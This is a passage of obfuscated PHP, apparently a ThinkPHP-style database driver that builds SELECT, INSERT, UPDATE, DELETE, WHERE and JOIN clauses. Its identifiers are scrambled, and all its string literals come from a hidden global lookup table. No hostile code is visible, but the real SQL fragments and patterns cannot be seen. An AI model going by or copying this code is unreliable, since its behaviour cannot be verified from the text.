$¢õ’ºü[17] => think_config($¢õ’ºü[1056])); } } return $äÒíßô; } protected function initConnect($õû±ä˜Œ = true) { if (1 == think_config($_SERVER[³Ôà×Ó][22])) { $this->_linkID = $this->multiConnect($õû±ä˜Œ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $çÂÈ‘¥ => $­ÍäÈ“¥) { $this->_linkID = $­ÍäÈ“¥; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ô¿œåÃÀ = false) { $Ò„¸¼ıä =& $_SERVER[³Ôà×Ó]; static $—Ûç„¡ = array(); static $–¯ş¹¾ø = -1; if (empty($—Ûç„¡)) { foreach ($this->config as $¨¥¸õ„ˆ => $ëİ™ãİ¢) { $—Ûç„¡[$¨¥¸õ„ˆ] = explode($Ò„¸¼ıä[50], $ëİ™ãİ¢); } } if (think_config($Ò„¸¼ıä[1057])) { if ($ô¿œåÃÀ || think_config($Ò„¸¼ıä[480]) === !0) { $â¨¹î¥˜ = floor(mt_rand(0, think_config($Ò„¸¼ıä[1058]) - 1)); $–¯ş¹¾ø = $â¨¹î¥˜; } else { if (is_numeric(think_config($Ò„¸¼ıä[1059]))) { $â¨¹î¥˜ = think_config($Ò„¸¼ıä[1059]); } else { $â¨¹î¥˜ = floor(mt_rand(think_config($Ò„¸¼ıä[1058]), count($—Ûç„¡[$Ò„¸¼ıä[961]]) - 1)); } } } else { $â¨¹î¥˜ = floor(mt_rand(0, count($—Ûç„¡[$Ò„¸¼ıä[961]]) - 1)); $–¯ş¹¾ø = $â¨¹î¥˜; } $â¨¹î¥˜ = $–¯ş¹¾ø !== -1 ? $–¯ş¹¾ø : $â¨¹î¥˜; $ğ ©ò”û = array($Ò„¸¼ıä[963] => isset($—Ûç„¡[$Ò„¸¼ıä[963]][$â¨¹î¥˜]) ? $—Ûç„¡[$Ò„¸¼ıä[963]][$â¨¹î¥˜] : $—Ûç„¡[$Ò„¸¼ıä[963]][0], $Ò„¸¼ıä[964] => isset($—Ûç„¡[$Ò„¸¼ıä[964]][$â¨¹î¥˜]) ? $—Ûç„¡[$Ò„¸¼ıä[964]][$â¨¹î¥˜] : $—Ûç„¡[$Ò„¸¼ıä[964]][0], $Ò„¸¼ıä[961] => isset($—Ûç„¡[$Ò„¸¼ıä[961]][$â¨¹î¥˜]) ? $—Ûç„¡[$Ò„¸¼ıä[961]][$â¨¹î¥˜] : $—Ûç„¡[$Ò„¸¼ıä[961]][0], $Ò„¸¼ıä[962] => isset($—Ûç„¡[$Ò„¸¼ıä[962]][$â¨¹î¥˜]) ? $—Ûç„¡[$Ò„¸¼ıä[962]][$â¨¹î¥˜] : $—Ûç„¡[$Ò„¸¼ıä[962]][0], $Ò„¸¼ıä[21] => isset($—Ûç„¡[$Ò„¸¼ıä[21]][$â¨¹î¥˜]) ? $—Ûç„¡[$Ò„¸¼ıä[21]][$â¨¹î¥˜] : $—Ûç„¡[$Ò„¸¼ıä[21]][0], $Ò„¸¼ıä[991] => isset($—Ûç„¡[$Ò„¸¼ıä[991]][$â¨¹î¥˜]) ? $—Ûç„¡[$Ò„¸¼ıä[991]][$â¨¹î¥˜] : $—Ûç„¡[$Ò„¸¼ıä[991]][0], $Ò„¸¼ıä[17] => isset($—Ûç„¡[$Ò„¸¼ıä[17]][$â¨¹î¥˜]) ? $—Ûç„¡[$Ò„¸¼ıä[17]][$â¨¹î¥˜] : $—Ûç„¡[$Ò„¸¼ıä[17]][0]); return $this->connect($ğ ©ò”û, $â¨¹î¥˜); } public function parseDSN($òÂÎƒø) { $Œµë×©± =& $_SERVER[³Ôà×Ó]; if (empty($òÂÎƒø)) { return !1; } $ÔÜ¬ù“ = parse_url($òÂÎƒø); if ($ÔÜ¬ù“[$Œµë×©±[207]]) { $”‘Êİì„ = array($Œµë×©±[1036] => $ÔÜ¬ù“[$Œµë×©±[207]], $Œµë×©±[963] => isset($ÔÜ¬ù“[$Œµë×©±[671]]) ? $ÔÜ¬ù“[$Œµë×©±[671]] : $Œµë×©±[12], $Œµë×©±[964] => isset($ÔÜ¬ù“[$Œµë×©±[1060]]) ? $ÔÜ¬ù“[$Œµë×©±[1060]] : $Œµë×©±[12], $Œµë×©±[961] => isset($ÔÜ¬ù“[$Œµë×©±[208]]) ? $ÔÜ¬ù“[$Œµë×©±[208]] : $Œµë×©±[12], $Œµë×©±[962] => isset($ÔÜ¬ù“[$Œµë×©±[209]]) ? $ÔÜ¬ù“[$Œµë×©±[209]] : $Œµë×©±[12], $Œµë×©±[21] => isset($ÔÜ¬ù“[$Œµë×©±[87]]) ? substr($ÔÜ¬ù“[$Œµë×©±[87]], 1) : $Œµë×©±[12]); } else { preg_match($Œµë×©±[1061], trim($òÂÎƒø), $°‡È­§ß); $”‘Êİì„ = array($Œµë×©±[1036] => $°‡È­§ß[1], $Œµë×©±[963] => $°‡È­§ß[2], $Œµë×©±[964] => $°‡È­§ß[3], $Œµë×©±[961] => $°‡È­§ß[4], $Œµë×©±[962] => $°‡È­§ß[5], $Œµë×©±[21] => $°‡È­§ß[6]); } $”‘Êİì„[$Œµë×©±[991]] = $Œµë×©±[12]; return $”‘Êİì„; } protected function debug() { $î÷¿ïñ =& $_SERVER[³Ôà×Ó]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $î÷¿ïñ[1062]; if (think_config($î÷¿ïñ[1063])) { think_status($î÷¿ïñ[1064]); think_trace($this->queryStr . $î÷¿ïñ[1065] . think_status($î÷¿ïñ[24], $î÷¿ïñ[1064], 6) . $î÷¿ïñ[1066], $î÷¿ïñ[12], $î÷¿ïñ[1067]); } } protected function parseLock($¤‡Š½ıÛ = false) { $Ó‚õŒÔŞ =& $_SERVER[³Ôà×Ó]; if (!$¤‡Š½ıÛ) { return $Ó‚õŒÔŞ[12]; } if ($Ó‚õŒÔŞ[993] == $this->dbType) { return $Ó‚õŒÔŞ[1068]; } return $Ó‚õŒÔŞ[1069]; } protected function parseSet($Î¶ã‡) { $ÉÉÆ ‚Ô =& $_SERVER[³Ôà×Ó]; foreach ($Î¶ã‡ as $åßŸš ­ => $¡ü…üı) { if (is_array($¡ü…üı) && $ÉÉÆ ‚Ô[373] == $¡ü…üı[0]) { $É‡ûï¥[] = $this->parseKey($åßŸš ­) . $ÉÉÆ ‚Ô[959] . $¡ü…üı[1]; } elseif (is_scalar($¡ü…üı) || is_null($¡ü…üı)) { $É‡ûï¥[] = $this->parseKey($åßŸš ­) . $ÉÉÆ ‚Ô[959] . $this->parseValue($¡ü…üı); } } return $ÉÉÆ ‚Ô[1070] . implode($ÉÉÆ ‚Ô[50], $É‡ûï¥); } protected function bindParam($‰Ú½“, $¨ÊîŒ‡) { $this->bind[$_SERVER[³Ôà×Ó][4] . $‰Ú½“] = $¨ÊîŒ‡; } protected function parseBind($Ş¤•ÄõÕ) { $Ş¤•ÄõÕ = array_merge($this->bind, $Ş¤•ÄõÕ); $this->bind = array(); return $Ş¤•ÄõÕ; } function parseKey(&$éëá”—Æ, $Úõü¸Îó = true) { if ($Úõü¸Îó) { $éëá”—Æ = $this->parseKeyCheck($éëá”—Æ); } return $éëá”—Æ; } function parseKeyCheck($×å»¥ó©) { $„ÜÒÈíŒ =& $_SERVER[³Ôà×Ó]; $×å»¥ó© = trim($×å»¥ó©); if (!preg_match($„ÜÒÈíŒ[1071], $×å»¥ó©)) { think_exception($„ÜÒÈíŒ[1072] . $×å»¥ó©); } return $×å»¥ó©; } protected function parseValue($Ôş¤†€×) { $Éğ‰…¤ =& $_SERVER[³Ôà×Ó]; if (is_string($Ôş¤†€×)) { $Ôş¤†€× = $Éğ‰…¤[1032] . $this->escapeString($Ôş¤†€×) . $Éğ‰…¤[1032]; } elseif (isset($Ôş¤†€×[0]) && is_string($Ôş¤†€×[0]) && strtolower($Ôş¤†€×[0]) == $Éğ‰…¤[373]) { $Ôş¤†€× = $this->escapeString($Ôş¤†€×[1]); } elseif (is_array($Ôş¤†€×)) { $Ôş¤†€× = array_map(array($this, $Éğ‰…¤[1033]), $Ôş¤†€×); } elseif (is_bool($Ôş¤†€×)) { $Ôş¤†€× = $Ôş¤†€× ? $Éğ‰…¤[91] : $Éğ‰…¤[228]; } elseif (is_null($Ôş¤†€×)) { $Ôş¤†€× = $Éğ‰…¤[106]; } return $Ôş¤†€×; } protected function parseField($‡©×íè·) { $úûİ–È™ =& $_SERVER[³Ôà×Ó]; if (is_string($‡©×íè·) && strpos($‡©×íè·, $úûİ–È™[50])) { $‡©×íè· = explode($úûİ–È™[50], $‡©×íè·); } if (is_array($‡©×íè·)) { $ Ä‡Ù‘¢ = array(); foreach ($‡©×íè· as $Ú¤”É»” => $¼™×º÷¢) { if (!is_numeric($Ú¤”É»”)) { $ Ä‡Ù‘¢[] = $this->parseKey($Ú¤”É»”, !1) . $úûİ–È™[1073] . $this->parseKey($¼™×º÷¢); } else { $ Ä‡Ù‘¢[] = $this->parseKey($¼™×º÷¢); } } $©¤–É‡ = implode($úûİ–È™[50], $ Ä‡Ù‘¢); } elseif (is_string($‡©×íè·) && !empty($‡©×íè·)) { $©¤–É‡ = $‡©×íè·; } else { $©¤–É‡ = $úûİ–È™[220]; } return $©¤–É‡; } protected function parseTable($É×¦Úİ²) { $æËÈ¸Æ =& $_SERVER[³Ôà×Ó]; if (is_array($É×¦Úİ²)) { $ø—¤Ç½ = array(); foreach ($É×¦Úİ² as $˜¸¼ö‚ => $ï‡Ä±Ÿ¡) { if (!is_numeric($˜¸¼ö‚)) { $ø—¤Ç½[] = $this->parseKey($˜¸¼ö‚) . $æËÈ¸Æ[53] . $this->parseKey($ï‡Ä±Ÿ¡); } else { $ø—¤Ç½[] = $this->parseKey($˜¸¼ö‚); } } $É×¦Úİ² = $ø—¤Ç½; } elseif (is_string($É×¦Úİ²)) { if (strstr($É×¦Úİ², $æËÈ¸Æ[53])) { return $É×¦Úİ²; } $É×¦Úİ² = explode($æËÈ¸Æ[50], $É×¦Úİ²); array_walk($É×¦Úİ², array($this, $æËÈ¸Æ[981])); } return $æËÈ¸Æ[975] . trim(implode($æËÈ¸Æ[1074], $É×¦Úİ²), $æËÈ¸Æ[470]) . $æËÈ¸Æ[975]; } protected function parseWhere($úšŠšÏŞ) { $Æïüîîí =& $_SERVER[³Ôà×Ó]; $™æï»× = $Æïüîîí[12]; if (is_string($úšŠšÏŞ)) { $™æï»× = $úšŠšÏŞ; } else { $”ÖÉÕ¯³ = isset($úšŠšÏŞ[$Æïüîîí[1075]]) ? strtoupper($úšŠšÏŞ[$Æïüîîí[1075]]) : $Æïüîîí[12]; if (in_array($”ÖÉÕ¯³, array($Æïüîîí[1076], $Æïüîîí[1077], $Æïüîîí[1078]))) { $”ÖÉÕ¯³ = $Æïüîîí[53] . $”ÖÉÕ¯³ . $Æïüîîí[53]; unset($úšŠšÏŞ[$Æïüîîí[1075]]); } else { $”ÖÉÕ¯³ = $Æïüîîí[1079]; } foreach ($úšŠšÏŞ as $¹ˆÄ×Ò => $»¼î·ñû) { $™æï»× .= $Æïüîîí[354]; if (is_numeric($¹ˆÄ×Ò)) { $¹ˆÄ×Ò = $Æïüîîí[1080]; } if (0 === strpos($¹ˆÄ×Ò, $Æïüîîí[11])) { $™æï»× .= $this->parseThinkWhere($¹ˆÄ×Ò, $»¼î·ñû); } else { if (!preg_match($Æïüîîí[1081], trim($¹ˆÄ×Ò))) { think_exception(think_lang($Æïüîîí[1082]) . $Æïüîîí[4] . $¹ˆÄ×Ò); } $àÛ‹›¤Š = is_array($»¼î·ñû) && isset($»¼î·ñû[$Æïüîîí[1083]]); $¹ˆÄ×Ò = trim($¹ˆÄ×Ò); if (strpos($¹ˆÄ×Ò, $Æïüîîí[214])) { $â¥°çš = explode($Æïüîîí[214], $¹ˆÄ×Ò); $Ê˜†²¡ = array(); foreach ($â¥°çš as $¼ã‚œú => $–³Éå“») { $ïÓì’„™ = $àÛ‹›¤Š ? $»¼î·ñû[$¼ã‚œú] : $»¼î·ñû; $Ê˜†²¡[] = $Æïüîîí[337] . $this->parseWhereItem($this->parseKey($–³Éå“»), $ïÓì’„™) . $Æïüîîí[980]; } $™æï»× .= implode($Æïüîîí[1084], $Ê˜†²¡); } elseif (strpos($¹ˆÄ×Ò, $Æïüîîí[360])) { $â¥°çš = explode($Æïüîîí[360], $¹ˆÄ×Ò); $Ê˜†²¡ = array(); foreach ($â¥°çš as $¼ã‚œú => $–³Éå“») { $ïÓì’„™ = $àÛ‹›¤Š ? $»¼î·ñû[$¼ã‚œú] : $»¼î·ñû; $Ê˜†²¡[] = $Æïüîîí[337] . $this->parseWhereItem($this->parseKey($–³Éå“»), $ïÓì’„™) . $Æïüîîí[980]; } $™æï»× .= implode($Æïüîîí[1079], $Ê˜†²¡); } else { $™æï»× .= $this->parseWhereItem($this->parseKey($¹ˆÄ×Ò), $»¼î·ñû); } } $™æï»× .= $Æïüîîí[355] . $”ÖÉÕ¯³; } $™æï»× = substr($™æï»×, 0, -strlen($”ÖÉÕ¯³)); } return empty($™æï»×) ? $Æïüîîí[12] : $Æïüîîí[1085] . $™æï»×; } protected function parseWhereItem($‰²ø‡Ó’, $İÂ×ƒ£) { $§Í¤ì´¦ =& $_SERVER[³Ôà×Ó]; $ó€ßûü€ = $§Í¤ì´¦[12]; if (is_array($İÂ×ƒ£)) { if (is_string($İÂ×ƒ£[0])) { $É‘ğƒÊã = strtolower($İÂ×ƒ£[0]); if (in_array($İÂ×ƒ£[0], array($§Í¤ì´¦[959], $§Í¤ì´¦[1086], $§Í¤ì´¦[1087], $§Í¤ì´¦[1088], $§Í¤ì´¦[1089], $§Í¤ì´¦[1090]))) { $ó€ßûü€ .= $‰²ø‡Ó’ . $§Í¤ì´¦[53] . $İÂ×ƒ£[0] . $§Í¤ì´¦[53] . $this->parseValue($İÂ×ƒ£[1]); } elseif (preg_match($§Í¤ì´¦[1091], $İÂ×ƒ£[0])) { $ó€ßûü€ .= $‰²ø‡Ó’ . $§Í¤ì´¦[53] . $this->exp[$É‘ğƒÊã] . $§Í¤ì´¦[53] . $this->parseValue($İÂ×ƒ£[1]); } elseif (preg_match($§Í¤ì´¦[1092], $İÂ×ƒ£[0])) { if (is_array($İÂ×ƒ£[1])) { $èÎùêç¯ = isset($İÂ×ƒ£[2]) ? strtoupper($İÂ×ƒ£[2]) : $§Í¤ì´¦[1077]; if (in_array($èÎùêç¯, array($§Í¤ì´¦[1076], $§Í¤ì´¦[1077], $§Í¤ì´¦[1078]))) { $Ô•è«Ş = array(); foreach ($İÂ×ƒ£[1] as $„±³êÔ•) { $Ô•è«Ş[] = $‰²ø‡Ó’ . $§Í¤ì´¦[53] . $this->exp[$É‘ğƒÊã] . $§Í¤ì´¦[53] . $this->parseValue($„±³êÔ•); } $ó€ßûü€ .= $§Í¤ì´¦[337] . implode($§Í¤ì´¦[53] . $èÎùêç¯ . $§Í¤ì´¦[53], $Ô•è«Ş) . $§Í¤ì´¦[980]; } } else { $ó€ßûü€ .= $‰²ø‡Ó’ . $§Í¤ì´¦[53] . $this->exp[$É‘ğƒÊã] . $§Í¤ì´¦[53] . $this->parseValue($İÂ×ƒ£[1]); } } elseif ($§Í¤ì´¦[373] == $É‘ğƒÊã) { $ó€ßûü€ .= $§Í¤ì´¦[978] . $‰²ø‡Ó’ . $§Í¤ì´¦[53] . $İÂ×ƒ£[1] . $§Í¤ì´¦[1093]; } elseif (preg_match($§Í¤ì´¦[1094], $İÂ×ƒ£[0])) { $ó€ßûü€ .= $İÂ×ƒ£[0]; } elseif (preg_match($§Í¤ì´¦[1095], $İÂ×ƒ£[0])) { if (isset($İÂ×ƒ£[2]) && $§Í¤ì´¦[373] == $İÂ×ƒ£[2]) { $ó€ßûü€ .= $‰²ø‡Ó’ . $§Í¤ì´¦[53] . $this->exp[$É‘ğƒÊã] . $§Í¤ì´¦[53] . $İÂ×ƒ£[1]; } else { if (is_string($İÂ×ƒ£[1])) { $İÂ×ƒ£[1] = explode($§Í¤ì´¦[50], $İÂ×ƒ£[1]); } $¥¾ıâğ¢ = implode($§Í¤ì´¦[50], $this->parseValue($İÂ×ƒ£[1])); $ó€ßûü€ .= $‰²ø‡Ó’ . $§Í¤ì´¦[53] . $this->exp[$É‘ğƒÊã] . $§Í¤ì´¦[978] . $¥¾ıâğ¢ . $§Í¤ì´¦[980]; } } elseif (preg_match($§Í¤ì´¦[1096], $İÂ×ƒ£[0])) { $‘Á·¢± = is_string($İÂ×ƒ£[1]) ? explode($§Í¤ì´¦[50], $İÂ×ƒ£[1]) : $İÂ×ƒ£[1]; $ó€ßûü€ .= $§Í¤ì´¦[978] . $‰²ø‡Ó’ . $§Í¤ì´¦[53] . $this->exp[$É‘ğƒÊã] . $§Í¤ì´¦[53] . $this->parseValue($‘Á·¢±[0]) . $§Í¤ì´¦[1079] . $this->parseValue($‘Á·¢±[1]) . $§Í¤ì´¦[355]; } else { think_exception(think_lang($§Í¤ì´¦[1082]) . $§Í¤ì´¦[4] . $İÂ×ƒ£[0]); } } else { $‡Òåş‚¢ = count($İÂ×ƒ£); $ªÅ­—Â = $§Í¤ì´¦[12]; if (is_string($İÂ×ƒ£[$‡Òåş‚¢ - 1])) { $ªÅ­—Â = isset($İÂ×ƒ£[$‡Òåş‚¢ - 1]) ? strtoupper($İÂ×ƒ£[$‡Òåş‚¢ - 1]) : $§Í¤ì´¦[12]; if (in_array($ªÅ­—Â, array($§Í¤ì´¦[1076], $§Í¤ì´¦[1077], $§Í¤ì´¦[1078]))) { $‡Òåş‚¢ = $‡Òåş‚¢ - 1; } } else { $ªÅ­—Â = $§Í¤ì´¦[1076]; } for ($¦êµÏË = 0; $¦êµÏË < $‡Òåş‚¢; $¦êµÏË++) { $‘Á·¢± = is_array($İÂ×ƒ£[$¦êµÏË]) ? $İÂ×ƒ£[$¦êµÏË][1] : $İÂ×ƒ£[$¦êµÏË]; if ($§Í¤ì´¦[373] == strtolower($İÂ×ƒ£[$¦êµÏË][0])) { $ó€ßûü€ .= $§Í¤ì´¦[337] . $‰²ø‡Ó’ . $§Í¤ì´¦[53] . $‘Á·¢± . $§Í¤ì´¦[1093] . $ªÅ­—Â . $§Í¤ì´¦[53]; } else { $Ä™ò“ÁØ = is_array($İÂ×ƒ£[$¦êµÏË]) ? $this->exp[strtolower($İÂ×ƒ£[$¦êµÏË][0])] : $§Í¤ì´¦[959]; if (!$Ä™ò“ÁØ && is_array($İÂ×ƒ£[$¦êµÏË]) && in_array($İÂ×ƒ£[$¦êµÏË][0], array($§Í¤ì´¦[959], $§Í¤ì´¦[1086], $§Í¤ì´¦[1087], $§Í¤ì´¦[1088], $§Í¤ì´¦[1089], $§Í¤ì´¦[1090]))) { $Ä™ò“ÁØ = $İÂ×ƒ£[$¦êµÏË][0]; } $ó€ßûü€ .= $§Í¤ì´¦[337] . $‰²ø‡Ó’ . $§Í¤ì´¦[53] . $Ä™ò“ÁØ . $§Í¤ì´¦[53] . $this->parseValue($‘Á·¢±) . $§Í¤ì´¦[1093] . $ªÅ­—Â . $§Í¤ì´¦[53]; } } $ó€ßûü€ = substr($ó€ßûü€, 0, -4); } } else { $ó€ßûü€ .= $‰²ø‡Ó’ . $§Í¤ì´¦[1097] . $this->parseValue($İÂ×ƒ£); } return $ó€ßûü€; } protected function parseThinkWhere($ˆª˜°¶‡, $â¹Ú²Ğ‹) { $˜‹ºâ  =& $_SERVER[³Ôà×Ó]; $ÆÈ·ßƒ„ = $˜‹ºâ [12]; switch ($ˆª˜°¶‡) { case $˜‹ºâ [428]: $ÆÈ·ßƒ„ = $â¹Ú²Ğ‹; break; case $˜‹ºâ [1080]: $ÆÈ·ßƒ„ = is_string($â¹Ú²Ğ‹) ? $â¹Ú²Ğ‹ : substr($this->parseWhere($â¹Ú²Ğ‹), 6); break; case $˜‹ºâ [1098]: parse_str($â¹Ú²Ğ‹, $Å¾Ä¹Ùø); if (isset($Å¾Ä¹Ùø[$˜‹ºâ [1075]])) { $ê®—‘ôè = $˜‹ºâ [53] . strtoupper($Å¾Ä¹Ùø[$˜‹ºâ [1075]]) . $˜‹ºâ [53]; unset($Å¾Ä¹Ùø[$˜‹ºâ [1075]]); } else { $ê®—‘ôè = $˜‹ºâ [1079]; } $›ì–°…– = array(); foreach ($Å¾Ä¹Ùø as $Ûƒœ€æ¸ => $š’¾´î´) { $›ì–°…–[] = $this->parseKey($Ûƒœ€æ¸) . $˜‹ºâ [1097] . $this->parseValue($š’¾´î´); } $ÆÈ·ßƒ„ = implode($ê®—‘ôè, $›ì–°…–); break; } return $ÆÈ·ßƒ„; } protected function parseLimit($Œ’Â„‡Ü) { $¢´ƒ¾ÕÑ =& $_SERVER[³Ôà×Ó]; return !empty($Œ’Â„‡Ü) ? $¢´ƒ¾ÕÑ[51] . $Œ’Â„‡Ü . $¢´ƒ¾ÕÑ[53] : $¢´ƒ¾ÕÑ[12]; } protected function parseJoin($™ïÕû»¢) { $ö†¯ç =& $_SERVER[³Ôà×Ó]; $Í’ˆ¶¯ = $ö†¯ç[12]; if (!empty($™ïÕû»¢)) { if (is_array($™ïÕû»¢)) { foreach ($™ïÕû»¢ as $ÒşÚç€ => $áññ…ÃÊ) { if (!1 !== stripos($áññ…ÃÊ, $ö†¯ç[1099])) { $Í’ˆ¶¯ .= $ö†¯ç[53] . $áññ…ÃÊ; } else { $Í’ˆ¶¯ .= $ö†¯ç[1100] . $áññ…ÃÊ; } } } else { $Í’ˆ¶¯ .= $ö†¯ç[1100] . $™ïÕû»¢; } } $Í’ˆ¶¯ = preg_replace($ö†¯ç[1101], think_config($ö†¯ç[1005]) . $ö†¯ç[1102], $Í’ˆ¶¯); return $Í’ˆ¶¯; } protected function parseOrder($î” Æ˜İ) { $„é‚´Ğ¬ =& $_SERVER[³Ôà×Ó]; if (is_array($î” Æ˜İ)) { $Ñ÷®²ìı = array(); foreach ($î” Æ˜İ as $ÌÍñ´²Ô => $á¯—µ´ ) { if (is_numeric($ÌÍñ´²Ô)) { $Ñ÷®²ìı[] = $this->parseKey($á¯—µ´ ); } else { $á¯—µ´  = in_array(strtoupper(trim($á¯—µ´ )), array($„é‚´Ğ¬[1103], $„é‚´Ğ¬[1104])) ? $„é‚´Ğ¬[53] . $á¯—µ´  : $„é‚´Ğ¬[12]; if (preg_match($„é‚´Ğ¬[1105], $ÌÍñ´²Ô)) { $Ñ÷®²ìı[] = $this->parseKey($ÌÍñ´²Ô) . $á¯—µ´ ; } else { think_exception($„é‚´Ğ¬[1106] . $ÌÍñ´²Ô); } } } $î” Æ˜İ = implode($„é‚´Ğ¬[50], $Ñ÷®²ìı); } return !empty($î” Æ˜İ) ? $„é‚´Ğ¬[1107] . $î” Æ˜İ : $„é‚´Ğ¬[12]; } protected function parseGroup($îŞ¨•–¸) { $¿ÉûÃËÍ =& $_SERVER[³Ôà×Ó]; return !empty($îŞ¨•–¸) ? $¿ÉûÃËÍ[1108] . $îŞ¨•–¸ : $¿ÉûÃËÍ[12]; } protected function parseHaving($üè¦Ïğ) { $ì˜ˆñÈ‹ =& $_SERVER[³Ôà×Ó]; return !empty($üè¦Ïğ) ? $ì˜ˆñÈ‹[1109] . $üè¦Ïğ : $ì˜ˆñÈ‹[12]; } protected function parseComment($ì’©¬Õı) { $ööæ“ =& $_SERVER[³Ôà×Ó]; return !empty($ì’©¬Õı) ? $ööæ“[1110] . $ì’©¬Õı . $ööæ“[1111] : $ööæ“[12]; } protected function parseDistinct($óŒß“æ) { $ÑÏÜ¥Ÿ =& $_SERVER[³Ôà×Ó]; return !empty($óŒß“æ) ? $ÑÏÜ¥Ÿ[1112] : $ÑÏÜ¥Ÿ[12]; } protected function parseUnion($à¸‰ÆÂ¡) { $ï‰ùà… =& $_SERVER[³Ôà×Ó]; if (empty($à¸‰ÆÂ¡)) { return $ï‰ùà…[12]; } if (isset($à¸‰ÆÂ¡[$ï‰ùà…[424]])) { $·Í÷äÄ = $ï‰ùà…[1113]; unset($à¸‰ÆÂ¡[$ï‰ùà…[424]]); } else { $·Í÷äÄ = $ï‰ùà…[1114]; } foreach ($à¸‰ÆÂ¡ as $¢ÃŸóÚ¸) { $ñ £şğ‚[] = $·Í÷äÄ . (is_array($¢ÃŸóÚ¸) ? $this->buildSelectSql($¢ÃŸóÚ¸) : $¢ÃŸóÚ¸); } return implode($ï‰ùà…[53], $ñ £şğ‚); } public function insert($ë¾íÚŸ³, $ğÔÒŸ£ß = array(), $ÂÛ£˜±å = false) { $‡÷…ò³É =& $_SERVER[³Ôà×Ó]; $¶·®‚’® = $Í¶®ÉÔï = array(); $this->model = $ğÔÒŸ£ß[$‡÷…ò³É[358]]; foreach ($ë¾íÚŸ³ as $öñ³ø => $­®•¯Üâ) { if (is_array($­®•¯Üâ) && $‡÷…ò³É[373] == $­®•¯Üâ[0]) { $Í¶®ÉÔï[] = $this->parseKey($öñ³ø); $¶·®‚’®[] = $­®•¯Üâ[1]; } elseif (is_scalar($­®•¯Üâ) || is_null($­®•¯Üâ)) { $Í¶®ÉÔï[] = $this->parseKey($öñ³ø); $¶·®‚’®[] = $this->parseValue($­®•¯Üâ); } } $ĞÌ®“Œ‚ = ($ÂÛ£˜±å ? $‡÷…ò³É[982] : $‡÷…ò³É[983]) . $‡÷…ò³É[984] . $this->parseTable($ğÔÒŸ£ß[$‡÷…ò³É[356]]) . $‡÷…ò³É[978] . implode($‡÷…ò³É[50], $Í¶®ÉÔï) . $‡÷…ò³É[979] . implode($‡÷…ò³É[50], $¶·®‚’®) . $‡÷…ò³É[980]; $ĞÌ®“Œ‚ .= $this->parseLock(isset($ğÔÒŸ£ß[$‡÷…ò³É[918]]) ? $ğÔÒŸ£ß[$‡÷…ò³É[918]] : !1); $ĞÌ®“Œ‚ .= $this->parseComment(!empty($ğÔÒŸ£ß[$‡÷…ò³É[430]]) ? $ğÔÒŸ£ß[$‡÷…ò³É[430]] : $‡÷…ò³É[12]); return $this->execute($ĞÌ®“Œ‚, $this->parseBind(!empty($ğÔÒŸ£ß[$‡÷…ò³É[361]]) ? $ğÔÒŸ£ß[$‡÷…ò³É[361]] : array())); } public function selectInsert($º¦›¾ä“, $Î—öÁØô, $úÉù—µ = array()) { $‡Ç«ƒíã =& $_SERVER[³Ôà×Ó]; $this->model = $úÉù—µ[$‡Ç«ƒíã[358]]; if (is_string($º¦›¾ä“)) { $º¦›¾ä“ = explode($‡Ç«ƒíã[50], $º¦›¾ä“); } array_walk($º¦›¾ä“, array($this, $‡Ç«ƒíã[981])); $¬í´íÅ = $‡Ç«ƒíã[1115] . $this->parseTable($Î—öÁØô) . $‡Ç«ƒíã[978] . implode($‡Ç«ƒíã[50], $º¦›¾ä“) . $‡Ç«ƒíã[1093]; $¬í´íÅ .= $this->buildSelectSql($úÉù—µ); return $this->execute($¬í´íÅ, $this->parseBind(!empty($úÉù—µ[$‡Ç«ƒíã[361]]) ? $úÉù—µ[$‡Ç«ƒíã[361]] : array())); } public function update($¥«ÒÙ€Ğ, $ÌÉîÂş) { $çì’Æ =& $_SERVER[³Ôà×Ó]; $this->model = $ÌÉîÂş[$çì’Æ[358]]; $ÒÄ¼£Ÿ¹ = $çì’Æ[1116] . $this->parseTable($ÌÉîÂş[$çì’Æ[356]]) . $this->parseSet($¥«ÒÙ€Ğ) . $this->parseWhere(!empty($ÌÉîÂş[$çì’Æ[352]]) ? $ÌÉîÂş[$çì’Æ[352]] : $çì’Æ[12]) . $this->parseOrder(!empty($ÌÉîÂş[$çì’Æ[450]]) ? $ÌÉîÂş[$çì’Æ[450]] : $çì’Æ[12]) . $this->parseLimit(!empty($ÌÉîÂş[$çì’Æ[368]]) ? $ÌÉîÂş[$çì’Æ[368]] : $çì’Æ[12]) . $this->parseLock(isset($ÌÉîÂş[$çì’Æ[918]]) ? $ÌÉîÂş[$çì’Æ[918]] : !1) . $this->parseComment(!empty($ÌÉîÂş[$çì’Æ[430]]) ? $ÌÉîÂş[$çì’Æ[430]] : $çì’Æ[12]); return $this->execute($ÒÄ¼£Ÿ¹, $this->parseBind(!empty($ÌÉîÂş[$çì’Æ[361]]) ? $ÌÉîÂş[$çì’Æ[361]] : array())); } public function delete($ï«Ôî•ã = array()) { $¸‚’€Ğ =& $_SERVER[³Ôà×Ó]; $this->model = $ï«Ôî•ã[$¸‚’€Ğ[358]]; $¼•ÎšŞ = $¸‚’€Ğ[1117] . $this->parseTable($ï«Ôî•ã[$¸‚’€Ğ[356]]) . $this->parseWhere(!empty($ï«Ôî•ã[$¸‚’€Ğ[352]]) ? $ï«Ôî•ã[$¸‚’€Ğ[352]] : $¸‚’€Ğ[12]) . $this->parseOrder(!empty($ï«Ôî•ã[$¸‚’€Ğ[450]]) ? $ï«Ôî•ã[$¸‚’€Ğ[450]] : $¸‚’€Ğ[12]) . $this->parseLimit(!empty($ï«Ôî•ã[$¸‚’€Ğ[368]]) ? $ï«Ôî•ã[$¸‚’€Ğ[368]] : $¸‚’€Ğ[12]) . $this->parseLock(isset($ï«Ôî•ã[$¸‚’€Ğ[918]]) ? $ï«Ôî•ã[$¸‚’€Ğ[918]] : !1) . $this->parseComment(!empty($ï«Ôî•ã[$¸‚’€Ğ[430]]) ? $ï«Ôî•ã[$¸‚’€Ğ[430]] : $¸‚’€Ğ[12]); return $this->execute($¼•ÎšŞ, $this->parseBind(!empty($ï«Ôî•ã[$¸‚’€Ğ[361]]) ? $ï«Ôî•ã[$¸‚’€Ğ[361]] : array())); } public function select($€Ì¦ôÌ = array()) { $²İ›ÔË™ =& $_SERVER[³Ôà×Ó]; $this->model = 